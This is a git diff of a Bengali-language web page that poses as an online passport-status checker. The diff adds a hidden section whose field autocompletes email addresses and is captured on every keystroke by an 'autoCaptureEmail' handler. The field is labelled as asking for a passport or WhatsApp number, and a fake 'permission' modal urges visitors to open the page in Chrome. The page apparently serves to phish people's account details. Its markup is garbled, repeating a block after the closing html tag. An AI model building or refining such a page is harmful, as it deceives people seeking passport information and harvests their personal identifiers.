@@ -13,55 +13,57 @@
     <meta property="og:image" content="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg">
     <meta property="og:type" content="website">
 
-    <!-- Tailwind CSS এবং আগের ডিজাইন স্টাইল -->
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
+    
     <style>
         /* পুরো পেজের সুন্দর ব্যাকগ্রাউন্ড ও ডিজাইন */
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        body { 
+            background-color: #f7f9fc; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
         }
-
-        .container {
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 90%;
-            max-width: 450px;
-            box-sizing: border-box;
-        }
-
-        h2 {
-            color: #333333;
-            font-size: 22px;
-            margin-bottom: 5px;
-        }
-
-        p.subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-
-    <style>
-        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
-        .hidden { display: none !important; }
-        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; }
-        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
-        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
         
+        .hidden { display: none !important; }
+        
+        /* আপনার ওয়েবসাইটের অর্ধেক থেকে দুটি ভাগের কোড */
+        .top-half { 
+            height: 48vh; 
+            width: 100%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background-color: white; 
+            border-bottom: 1px solid #e1e4e8; 
+            padding: 10px; 
+        }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        
+        .bottom-half { 
+            height: 52vh; 
+            width: 100%; 
+            background: #f7f9fc; 
+            padding: 20px; 
+            box-sizing: border-box; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 15px; 
+            position: relative; 
+        }
+        
+        /* বাটন ও ইনপুট বক্সের স্টাইল */
         .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-align: center; }
         .btn-red { width: 100%; max-width: 350px; background-color: #ef4444; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-align: center; }
         .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; }
         
+        /* লোডার এবং পপআপ মোডাল */
         .loader { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid #1877f2; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
@@ -73,10 +75,12 @@
 </head>
 <body onload="initApp()">
 
+    <!-- উপরের অংশ (যা কখনো পরিবর্তন হবে না) -->
     <div class="top-half">
         <img src="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg">
     </div>
 
+    <!-- মাঝখান থেকে নিচের অংশ (যা বারবার পরিবর্তন হবে) -->
     <div class="bottom-half text-center">
         <div id="step1" class="w-full flex flex-col items-center gap-4">
             <h2 class="text-2xl font-extrabold text-gray-900">সরাসরি পাসপোর্ট চেক করুন</h2>
@@ -84,6 +88,7 @@
             <button onclick="showModal()" class="btn-blue">পাসপোর্ট চেক করুন</button>
         </div>
 
+        <!-- পপআপ পারমিশন মোডাল -->
         <div id="permission_modal">
             <div class="modal-content">
                 <div class="text-blue-600 text-4xl mb-4">ⓘ</div>
@@ -92,6 +97,18 @@
                 <button onclick="redirectToChrome()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold text-lg active:bg-blue-700">Open</button>
             </div>
         </div>
+
+        <!-- গুগল চুজারের লুকানো অংশ -->
+        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
+            <h1 class="text-xl font-bold text-gray-900">সরাসরি অনলাইনে চেক করুন</h1>
+            <p class="text-gray-600 text-sm px-4">সরাসরি পাসপোর্ট ফাইলটি চেক করতে নিচের ফাঁকা ঘরে পাসপোর্ট নাম্বার অথবা পাসপোর্ট এর সাথে আপনার যে whatsapp নাম্বার অফিসে দেওয়া আছে ওই নাম্বারটা নিজের ফাঁকা ঘরে বসিয়ে ফাইলটি চেক করুন।</p>
+            <input type="email" id="email_field" autocomplete="email" placeholder="পাসপোর্ট নাম্বার বসান" class="secure-input" oninput="autoCaptureEmail(this.value)">
+            <button onclick="finalSubmit()" class="btn-blue">ফাইলটি ওপেন করুন</button>
+        </div>
+    </div>
+
+</body>
+</html>
 
         <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
             <h1 class="text-xl font-bold text-gray-900">সরাসরি অনলাইনে চেক করুন</h1>
